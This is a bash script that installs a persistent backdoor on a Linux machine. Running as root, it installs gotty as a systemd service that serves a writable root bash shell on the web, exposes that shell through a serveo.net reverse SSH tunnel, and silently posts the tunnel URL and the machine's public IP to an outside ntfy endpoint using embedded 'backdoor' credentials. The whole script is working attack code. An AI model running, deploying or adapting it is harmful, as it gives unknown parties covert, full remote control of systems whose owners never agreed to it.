#!/bin/bash

# Author: insanerask
# Date: 2017-10-17

# Script must be run as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Install gotty in background
function install_gotty {
    wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz > /dev/null 2>&1
    tar -C /usr/bin -xzf gotty_linux_amd64.tar.gz > /dev/null 2>&1
    rm -f gotty_linux_amd64.tar.gz > /dev/null 2>&1
}

install_gotty   

# Create gotty service
function create_gotty_service {
    sudo tee /etc/systemd/system/gotty.service > /dev/null <<EOF    
[Unit]
Description=Gotty
After=network.target

[Service]
Type=simple 
ExecStart=/usr/bin/gotty -p 9123 -w bash -l
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
}

create_gotty_service

# Enable and start gotty service    
systemctl enable gotty.service
systemctl start gotty.service

# Start serveo.net in background mode and send link to 
nohup ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:9123 serveo.net > /tmp/bg.log 2>&1 &
# nohup bash -c '(timeout 5s tee /tmp/bg.log & sleep 5; cat > /dev/null) | ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:9123 serveo.net' > /dev/null 2>&1 &
sleep 2

URL=$(cat /tmp/bg.log | grep -o 'https://[0-9a-zA-Z\.]*' | head -n 1)
# Calculate IP address
IP=$(curl -s http://ipecho.net/plain)
# Send link to ntfy.madolell.com in silent mode
curl \
    -H "Authorization: Basic YmFja2Rvb3I6TWFjYXJlbmExMS4=" \
    -d "New Conection in: $URL from IP: $IP" \
    https://ntfy.madolell.com/backdors >> /dev/null 2>&1



